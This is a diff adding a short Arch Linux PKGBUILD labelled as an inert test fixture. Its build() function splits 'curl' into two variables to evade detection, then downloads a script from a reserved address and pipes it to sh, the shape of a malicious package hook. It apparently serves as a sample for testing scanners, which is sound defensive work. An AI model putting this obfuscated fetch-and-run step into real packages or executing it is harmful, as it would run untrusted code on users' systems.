@@ -1,0 +1,13 @@
+# Inert test fixture: nothing here is ever run, and every address is reserved or fake.
+pkgname=name-in-parts
+pkgver=1.0
+pkgrel=1
+arch=(x86_64)
+url=https://example.org/demo
+source=(https://example.org/demo.tar.gz)
+sha256sums=(0000000000000000000000000000000000000000000000000000000000000000)
+build() {
+  c=cu
+  d=rl
+  "$c$d" -s http://198.51.100.46/x | sh
+}
